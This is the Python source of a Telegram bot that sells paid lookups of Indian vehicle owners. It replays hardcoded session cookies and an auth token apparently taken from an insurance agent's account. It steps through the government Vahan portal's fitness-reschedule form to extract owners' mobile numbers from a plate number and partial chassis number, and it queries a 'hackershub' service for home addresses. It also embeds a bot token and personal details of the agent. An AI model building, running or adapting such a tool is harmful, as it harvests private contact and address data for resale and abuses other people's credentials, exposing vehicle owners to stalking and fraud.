import os
import sys
import time
import re
import json
import requests
import telebot
from bs4 import BeautifulSoup

# ========== Bot Configuration ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8926183222:AAERWMctyo_cyyTQ9Q-6d4ZcTrqVd1ztZeE")
bot = telebot.TeleBot(BOT_TOKEN)

# ========== Admin Configuration ==========
ADMIN_ID = 8273728944         # Admin Telegram ID 
ADMIN_USERNAME = "MRXIXZ"      # Admin username

# ========== JSON Database System ==========
# Railway par permanent storage ke liye hum environment variable ka use karenge
DATA_FILE = os.environ.get("DATA_PATH", "database.json")

def load_data():
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def register_user(user_id):
    """Save user ID in JSON and give 1 free credit if new."""
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        # Default user structure: credits aur total usage track karenge
        data[uid] = {"credits": 0, "usage": 0}
        if user_id != ADMIN_ID:
            data[uid]["credits"] = 1  # 1 Free Credit for new users
        save_data(data)
        return True
    return False

def get_user_credits(user_id):
    data = load_data()
    return data.get(str(user_id), {}).get("credits", 0)

def add_credits(user_id, amount):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"credits": 0, "usage": 0}
    data[uid]["credits"] += amount
    save_data(data)

def deduct_credit(user_id):
    """Deduct 1 credit. Admin always passes."""
    if user_id == ADMIN_ID:
        return True
    data = load_data()
    uid = str(user_id)
    if uid in data and data[uid]["credits"] >= 1:
        data[uid]["credits"] -= 1
        save_data(data)
        return True
    return False

def increment_usage(user_id):
    """Track how many successful searches a user has done."""
    data = load_data()
    uid = str(user_id)
    if uid in data:
        data[uid]["usage"] = data[uid].get("usage", 0) + 1
        save_data(data)

def get_all_users():
    """Return list of all registered user IDs."""
    data = load_data()
    return list(data.keys())

# ========== API Constants ==========
API2_URL = "https://pro.turtlemintinsurance.com/api/fetchVehicleDetails"
COOKIES = (
    "_fbp=fb.1.1772259908095.606514460303804090; _gcl_au=1.1.1848471881.1772259909; "
    "_ga=GA1.3.368687266.1772259910; authToken=7302e85f1409b50e74877c76968df7f59a1dea30632a8ff5d3a5418498a48f66b46ed8d5d25ff791cbb98231a7cf3d90; "
    "dealerUserName=694464a8e947eb5219a3bbd0; pospUserName=694464a8e947eb5219a3bbd0; "
    "PLAY_SESSION=823d548f0ccb6adfb5fbfa2dd7a8a7d3d0afc6b1-dealerUserName=694464a8e947eb5219a3bbd0&pospUserName=694464a8e947eb5219a3bbd0&tenant=turtlemint&agent_mobile=8052036881&host=http%3A%2F%2Fmotor-service%3A9000&X-Forwarded-For=49.43.119.180%2C+64.252.100.109%2C49.43.119.180&x-partner-id=694464a8e947eb5219a3bbd0&broker=turtlemint&dealerName=hanumat+prashd+chaudhary+&mobile=8052036881&x-flow-type=b2b;"
)

API2_HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 9; Infinix X650C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36",
    "accept": "application/json, text/plain, */*",
    "x-requested-with": "in.mintpro",
    "referer": "https://pro.turtlemintinsurance.com/car-insurance/create",
    "cookie": COOKIES
}

SMC_URL = "https://www.smcinsurance.com/central/centralcall/CallReqWithHeader"
SMC_HEADERS = {
    "Host": "www.smcinsurance.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Infinix X650C Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.179 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Cookie": "MCBC=QbfuAohnL%2FZYUQdGuIfxo4SZZwM0UwJs8PTw2NU7YEU%3D%3A9e654d8c76b15003c46ccc1844de8ad9bbf0b99a33d2088ab53f778436bcf142"
}

HOMEPAGE_URL = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/statevalidation/homepage.xhtml?statecd=Mzc2MzM2MzAzNjY0MzIzODM3NjIzNjY0MzY2MjM3NDQ0Yw=="
HOMEPAGE_BASE = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/statevalidation/homepage.xhtml"
LOGIN_URL = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/usermgmt/login.xhtml"
FORM_URL = "https://vahan.parivahan.gov.in/vahanservice/vahan/ui/balanceservice/form_reschedule_fitness.xhtml"

# ========== Helper Functions ==========
def extract_viewstate(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    vs = soup.find('input', {'name': 'javax.faces.ViewState'})
    return vs.get('value') if vs else None

def extract_viewstate_from_ajax(text):
    m = re.search(r'<update id="j_id1:javax.faces.ViewState:0"><!\[CDATA\[(.*?)\]\]></update>', text)
    return m.group(1) if m else None

def find_checkbox_id(html):
    m = re.search(r'id="(j_idt\d+)"[^>]*class="[^"]*ui-chkbox', html)
    return m.group(1) if m else "j_idt187"

# ========== API Fetchers ==========
def fetch_full_vehicle_data(reg_no):
    params = {"registrationNumber": reg_no, "vertical": "FW"}
    try:
        response = requests.get(API2_URL, headers=API2_HEADERS, params=params, timeout=15)
        response.raise_for_status()
        data = response.json()
        reg_result = data.get("registrationResult", {})
        chassis_full = reg_result.get("chasisno", "")
        if chassis_full and len(str(chassis_full)) >= 5:
            last_5 = str(chassis_full)[-5:]
            details = {
                "owner": reg_result.get("ownerFirstName", "N/A"),
                "make": reg_result.get("make", "N/A"),
                "model": reg_result.get("model", "N/A"),
                "fuel": reg_result.get("fuel", "N/A"),
                "reg_date": reg_result.get("registrationDate", "N/A"),
                "chassis": chassis_full,
                "engine": reg_result.get("engineno", "N/A"),
                "rto": reg_result.get("rto", {}).get("rtoPlateLntLoc", "N/A")
            }
            return {"success": True, "chassis_last5": last_5, "details": details}
        else:
            return {"success": False, "error": "Chassis number not found or too short."}
    except Exception as e:
        return {"success": False, "error": f"Turtlemint API error: {e}"}

def fetch_smc_vehicle_details(reg_no):
    payload = {"URL": "GetVaahanDetailsByVehicleNo", "Props": [reg_no], "Token": ""}
    try:
        response = requests.post(SMC_URL, headers=SMC_HEADERS, json=payload, timeout=15)
        if response.status_code == 200:
            data = response.json()
            vehicle_info = data.get("response", {})
            return {"success": True, "data": vehicle_info}
        else:
            return {"success": False, "error": f"SMC HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": f"SMC error: {e}"}

def fetch_address_api(reg_no):
    url = f"https://api.hackershub.shop/info.php?type=address&registration={reg_no}"
    try:
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            return {"success": True, "data": response.json()}
        return {"success": False}
    except Exception as e:
        return {"success": False, "error": str(e)}

def fetch_mobile_number_requests(vehicle_number, chassis_last_5):
    try:
        session = requests.Session()
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
        }
        ajax_headers = {
            'User-Agent': base_headers['User-Agent'],
            'Accept': 'application/xml, text/xml, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Faces-Request': 'partial/ajax',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://vahan.parivahan.gov.in',
            'Accept-Language': 'en-GB,en;q=0.9',
        }
        r1 = session.get(HOMEPAGE_URL, headers=base_headers, timeout=30)
        viewstate = extract_viewstate(r1.text)
        checkbox_id = find_checkbox_id(r1.text)
        
        ajax_headers['Referer'] = HOMEPAGE_URL
        payload2 = {'javax.faces.partial.ajax': 'true', 'javax.faces.source': 'fit_c_office_to', 'javax.faces.partial.execute': 'fit_c_office_to', 'javax.faces.behavior.event': 'change', 'javax.faces.partial.event': 'change', 'homepageformid': 'homepageformid', 'j_idt12': '', 'j_idt47_input': 'en', 'state_cd_filter': '', 'fit_c_office_to_input': '1', 'abc': 'abc', 'javax.faces.ViewState': viewstate, 'pmtchk_input': '-1', 'nocregnno': ''}
        r2 = session.post(HOMEPAGE_BASE, data=payload2, headers=ajax_headers, timeout=30)
        viewstate = extract_viewstate_from_ajax(r2.text) or viewstate
        
        payload3 = {'javax.faces.partial.ajax': 'true', 'javax.faces.source': checkbox_id, 'javax.faces.partial.execute': checkbox_id, 'javax.faces.partial.render': 'proccedHomeButtonId', 'javax.faces.behavior.event': 'change', 'javax.faces.partial.event': 'change', 'homepageformid': 'homepageformid', 'j_idt12': '', 'j_idt47_input': 'en', 'state_cd_filter': '', 'fit_c_office_to_input': '1', f'{checkbox_id}_input': 'on', 'abc': 'abc', 'javax.faces.ViewState': viewstate, 'pmtchk_input': '-1', 'nocregnno': ''}
        r3 = session.post(HOMEPAGE_BASE, data=payload3, headers=ajax_headers, timeout=30)
        viewstate = extract_viewstate_from_ajax(r3.text) or viewstate
        
        payload4 = {'javax.faces.partial.ajax': 'true', 'javax.faces.source': 'proccedHomeButtonId', 'javax.faces.partial.execute': '@all', 'javax.faces.partial.render': 'regnid facelesslist portaldownMsgPnl mainhomepagepnl leftmenupnlid leftmenupnlidservdown', 'proccedHomeButtonId': 'proccedHomeButtonId', 'homepageformid': 'homepageformid', 'j_idt12': '', 'j_idt47_input': 'en', 'state_cd_filter': '', 'fit_c_office_to_input': '1', f'{checkbox_id}_input': 'on', 'abc': 'abc', 'javax.faces.ViewState': viewstate, 'pmtchk_input': '-1', 'nocregnno': ''}
        r4 = session.post(HOMEPAGE_BASE, data=payload4, headers=ajax_headers, timeout=30)
        viewstate = extract_viewstate_from_ajax(r4.text) or viewstate
        
        dialog_match = re.search(r'id="(j_idt\d+)"[^>]*class="[^"]*ui-button', r4.text)
        dialog_btn = dialog_match.group(1) if dialog_match else "j_idt536"
        payload5 = {'javax.faces.partial.ajax': 'true', 'javax.faces.source': dialog_btn, 'javax.faces.partial.execute': '@all', f'{dialog_btn}': dialog_btn, 'homepageformid': 'homepageformid', 'j_idt12': '', 'j_idt47_input': 'en', 'state_cd_filter': '', 'fit_c_office_to_input': '1', f'{checkbox_id}_input': 'on', 'pmtchk_input': '-1', 'nocregnno': '', 'javax.faces.ViewState': viewstate}
        r5 = session.post(HOMEPAGE_BASE, data=payload5, headers=ajax_headers, timeout=30)
        viewstate = extract_viewstate_from_ajax(r5.text) or viewstate
        
        login_headers = base_headers.copy()
        login_headers['Referer'] = HOMEPAGE_URL
        r6 = session.get(LOGIN_URL + "?faces-redirect=true", headers=login_headers, timeout=30, allow_redirects=True)
        viewstate = extract_viewstate(r6.text)
        
        fit_btn_match = re.search(r'id="(j_idt\d+)"[^>]*name="\1"[^>]*type="submit"', r6.text)
        fit_btn = fit_btn_match.group(1) if fit_btn_match else "j_idt506"
        post_headers = base_headers.copy()
        post_headers['Content-Type'] = 'application/x-www-form-urlencoded'
        post_headers['Origin'] = 'https://vahan.parivahan.gov.in'
        post_headers['Referer'] = LOGIN_URL + "?faces-redirect=true"
        payload7 = {'loginForm': 'loginForm', f'{fit_btn}': fit_btn, 'javax.faces.ViewState': viewstate, 'InputEnter': '', 'fitbalcTest': 'fitbalcTest', 'pur_cd': '86'}
        r7 = session.post(LOGIN_URL, data=payload7, headers=post_headers, timeout=30, allow_redirects=True)
        
        form_headers = base_headers.copy()
        form_headers['Referer'] = LOGIN_URL + "?faces-redirect=true"
        form_headers['Cache-Control'] = 'max-age=0'
        r8 = session.get(FORM_URL, headers=form_headers, timeout=30)
        viewstate = extract_viewstate(r8.text)
        
        ajax_headers['Referer'] = FORM_URL
        payload9 = {'javax.faces.partial.ajax': 'true', 'javax.faces.source': 'balanceFeesFine:validate_dtls', 'javax.faces.partial.execute': '@all', 'javax.faces.partial.render': 'balanceFeesFine:auth_panel', 'balanceFeesFine:validate_dtls': 'balanceFeesFine:validate_dtls', 'balanceFeesFine': 'balanceFeesFine', 'balanceFeesFine:tf_reg_no': vehicle_number, 'balanceFeesFine:tf_chasis_no': chassis_last_5, 'javax.faces.ViewState': viewstate}
        r9 = session.post(FORM_URL, data=payload9, headers=ajax_headers, timeout=30)
        text = r9.text
        
        patterns = [
            r'id="balanceFeesFine:tf_mobile"[^>]*value="(\d{10})"',
            r'value="(\d{10})"[^>]*id="balanceFeesFine:tf_mobile"',
            r'balanceFeesFine:tf_mobile[^>]*value="(\d{10})"',
        ]
        for pat in patterns:
            m = re.search(pat, text, re.DOTALL)
            if m:
                mobile = m.group(1)
                if mobile.startswith(('6','7','8','9')):
                    return {"success": True, "mobile_number": mobile}
        fallback = re.findall(r'\b([6-9]\d{9})\b', text)
        if fallback:
            return {"success": True, "mobile_number": fallback[0]}
        return {"success": False, "error": "Mobile number not found"}
    except Exception as e:
        return {"success": False, "error": f"Requests failure: {e}"}

# ========== Telegram Bot Handlers ==========
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    is_new = register_user(user_id)
    if user_id == ADMIN_ID:
        welcome = f"👋 Welcome Admin @{ADMIN_USERNAME}!\nYou have unlimited credits.\nUse /broadcast to send messages.\nUse /addcredit <user_id> <credits> to add credits to users."
    else:
        credits = get_user_credits(user_id)
        if is_new:
            welcome = f"👋 Welcome! You have received 1 FREE credit.\n💰 Your balance: {credits} credit (1 search = 1 credit)\n\nSend any vehicle number to get details.\nTo buy more credits, contact @{ADMIN_USERNAME} (1 credit = ₹4)"
        else:
            welcome = f"👋 Welcome back!\n💰 Your balance: {credits} credits (1 search = 1 credit)\n\nSend vehicle number or /balance\nTo buy more credits, contact @{ADMIN_USERNAME}"
    bot.reply_to(message, welcome)

@bot.message_handler(commands=['balance'])
def show_balance(message):
    user_id = message.chat.id
    if user_id == ADMIN_ID:
        bot.reply_to(message, f"👑 Admin @{ADMIN_USERNAME} has unlimited credits.")
        return
    credits = get_user_credits(user_id)
    bot.reply_to(message, f"💰 *Your credit balance:* {credits}\n\n1 search = 1 credit\nNeed more? Contact @{ADMIN_USERNAME}", parse_mode="Markdown")

@bot.message_handler(commands=['addcredit'])
def add_credit_command(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "⛔ You are not authorized to use this command.")
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ Usage: `/addcredit <user_id> <credits>`\nExample: `/addcredit 8273728944 10`", parse_mode="Markdown")
        return
    try:
        target_id = int(parts[1])
        amount = int(parts[2])
        if amount <= 0:
            raise ValueError
        register_user(target_id)
        add_credits(target_id, amount)
        bot.reply_to(message, f"✅ Added {amount} credits to user {target_id}.")
        try:
            bot.send_message(target_id, f"🎉 {amount} credits have been added to your account! New balance: {get_user_credits(target_id)} credits.\nUse /balance to check.")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid user ID or amount. Use: `/addcredit <user_id> <amount>`", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.chat.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Only admin can use this command.")
        return
    text = message.text.strip()
    if len(text) < 11:
        bot.reply_to(message, "❌ Usage: `/broadcast <message>`\nExample: `/broadcast Server will be down at 2 AM`", parse_mode="Markdown")
        return
    broadcast_msg = text[11:]
    users = get_all_users()
    if not users:
        bot.reply_to(message, "⚠️ No users registered yet.")
        return
    success = 0
    fail = 0
    for uid in users:
        try:
            bot.send_message(int(uid), f"📢 *ANNOUNCEMENT FROM ADMIN*\n\n{broadcast_msg}", parse_mode="Markdown")
            success += 1
        except Exception:
            fail += 1
    bot.reply_to(message, f"✅ Broadcast completed.\nSent: {success}\nFailed: {fail}")

@bot.message_handler(func=lambda message: True)
def process_vehicle(message):
    user_id = message.chat.id
    reg_no = message.text.strip().upper()
    register_user(user_id) 

    if len(reg_no) < 4 or not reg_no.isalnum():
        bot.reply_to(message, "❌ Please send a valid vehicle registration number (e.g., UP42BU0010).")
        return
    
    # Pre-check Balance
    if user_id != ADMIN_ID and get_user_credits(user_id) < 1:
        credits = get_user_credits(user_id)
        bot.reply_to(message, f"⚠️ <b>Insufficient credits!</b>\nYour balance: {credits} credits.\n1 search costs 1 credit.\nPlease contact @{ADMIN_USERNAME} to purchase more credits.", parse_mode="HTML")
        return

    status_msg = bot.reply_to(message, f"🔍 Fetching details for <code>{reg_no}</code>...", parse_mode="HTML")
    
    # API Calls
    api = fetch_full_vehicle_data(reg_no)
    if not api["success"]:
        bot.edit_message_text(f"❌ Error: {api['error']}", user_id, status_msg.message_id)
        return
        
    details = api["details"]
    chassis5 = api["chassis_last5"]
    smc_res = fetch_smc_vehicle_details(reg_no)
    mobile_res = fetch_mobile_number_requests(reg_no, chassis5)
    addr_res = fetch_address_api(reg_no)
    
    smc = smc_res.get("data", {}) if smc_res.get("success") else {}
    address_data = addr_res.get("data", {}) if addr_res.get("success") else {}

    # Update Usage Stats for successful fetch
    increment_usage(user_id)

    # Manage Credits & Admin Notifications based on Mobile Result
    if mobile_res.get("success"):
        deduct_credit(user_id) # Credit deduct
        current_balance = "Unlimited (Admin)" if user_id == ADMIN_ID else get_user_credits(user_id)
        credit_footer = f"📉 <b>1 Credit deducted.</b>\n💰 <b>Remaining balance:</b> {current_balance}"
        try:
            bot.send_message(ADMIN_ID, f"🔔 <b>Search Alert</b>\n👤 User ID: <code>{user_id}</code>\n🚗 Searched: <code>{reg_no}</code>\n📱 Status: Mobile Found ✅\n💰 User Balance: {current_balance}", parse_mode="HTML")
        except: pass
    else:
        # Credit safe
        current_balance = "Unlimited (Admin)" if user_id == ADMIN_ID else get_user_credits(user_id)
        credit_footer = f"🎁 <b>0 Credits deducted. (Mobile not found)</b>\n💰 <b>Remaining balance:</b> {current_balance}"
        try:
            bot.send_message(ADMIN_ID, f"🔔 <b>Search Alert</b>\n👤 User ID: <code>{user_id}</code>\n🚗 Searched: <code>{reg_no}</code>\n📱 Status: Mobile Not Found ❌\n💰 User Balance: {current_balance}", parse_mode="HTML")
        except: pass

    def get_val(val1, val2=None, default="N/A"):
        if val1 and str(val1).strip() != "": return str(val1).strip()
        if val2 and str(val2).strip() != "": return str(val2).strip()
        return default

    # Build UI
    final = f"🚘 <b>VEHICLE DETAILS FOR: {reg_no}</b> 🚘\n"
    final += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"

    final += f"📋 <b>BASIC DETAILS</b>\n"
    final += f"🔢 <b>Reg Number:</b> <code>{reg_no}</code>\n"
    final += f"🏢 <b>RTO:</b> {get_val(smc.get('regAuthority'), details.get('rto'))}\n"
    final += f"📅 <b>Reg Date:</b> {get_val(smc.get('regDate'), details.get('reg_date'))}\n"
    final += f"⚖️ <b>Vehicle Class:</b> {get_val(smc.get('vehicleClass'))}\n"
    final += f"🧑‍🤝‍🧑 <b>Seating Capacity:</b> {get_val(smc.get('seatCapacity'))}\n\n"

    final += f"👤 <b>OWNER DETAILS</b>\n"
    final += f"👑 <b>Owner Name:</b> {get_val(smc.get('owner'), details.get('owner'))}\n"
    final += f"👨‍🦳 <b>Father Name:</b> {get_val(smc.get('ownerFatherName'))}\n"
    if mobile_res.get("success"):
        final += f"📞 <b>Mobile:</b> <code>{mobile_res['mobile_number']}</code>\n"
    else:
        final += f"📞 <b>Mobile:</b> Not Found ❌\n"
        
    final += f"🏠 <b>Present Add:</b> {get_val(address_data.get('present_address'), smc.get('presentAddress'))}\n"
    final += f"📍 <b>Perm Add:</b> {get_val(address_data.get('permanent_address'), smc.get('permAddress'))}\n\n"

    final += f"🚗 <b>VEHICLE SPECIFICATIONS</b>\n"
    final += f"🏭 <b>Maker:</b> {get_val(smc.get('manufacturer'), details.get('make'))}\n"
    final += f"🚙 <b>Model:</b> {get_val(smc.get('vehicle'), details.get('model'))}\n"
    final += f"🎨 <b>Variant:</b> {get_val(smc.get('variant'))}\n"
    final += f"⛽ <b>Fuel Type:</b> {get_val(smc.get('fuelType'), details.get('fuel'))}\n"
    final += f"📏 <b>Engine CC:</b> {get_val(smc.get('cubicCapacity'))}\n"
    final += f"🔩 <b>Chassis No:</b> <code>{get_val(details.get('chassis'), smc.get('chassis'))}</code>\n"
    final += f"⚙️ <b>Engine No:</b> <code>{get_val(smc.get('engine'), details.get('engine'))}</code>\n"
    final += f"📅 <b>Mfg Year/Month:</b> {get_val(smc.get('manufacturerMonthYear'))}\n\n"

    final += f"🏦 <b>INSURANCE & FINANCE</b>\n"
    final += f"💸 <b>Financer:</b> {get_val(smc.get('financerName'))}\n"
    final += f"🛡️ <b>Insurance:</b> {get_val(smc.get('insuranceCompanyName'))}\n"
    final += f"📜 <b>Policy No:</b> <code>{get_val(smc.get('insurancePolicyNumber'))}</code>\n"
    final += f"⏳ <b>Valid Upto:</b> {get_val(smc.get('insuranceUpto'))}\n\n"

    final += f"💨 <b>PUCC DETAILS</b>\n"
    final += f"📄 <b>PUCC No:</b> <code>{get_val(smc.get('puccNumber'))}</code>\n"
    final += f"⌛ <b>Valid Upto:</b> {get_val(smc.get('puccValidUpto'))}\n"
    
    final += f"━━━━━━━━━━━━━━━━━━━━━━\n"
    final += credit_footer

    try:
        bot.edit_message_text(final, user_id, status_msg.message_id, parse_mode="HTML")
    except Exception as e:
        if "message too long" in str(e).lower():
            for i in range(0, len(final), 4000):
                bot.send_message(user_id, final[i:i+4000], parse_mode="HTML")
        else:
            bot.edit_message_text(f"Error: {str(e)[:100]}", user_id, status_msg.message_id)

# ========== Run Bot ==========
if __name__ == "__main__":
    print("🤖 Bot starting...")
    print(f"Admin ID: {ADMIN_ID}, Username: @{ADMIN_USERNAME}")
    bot.infinity_polling()
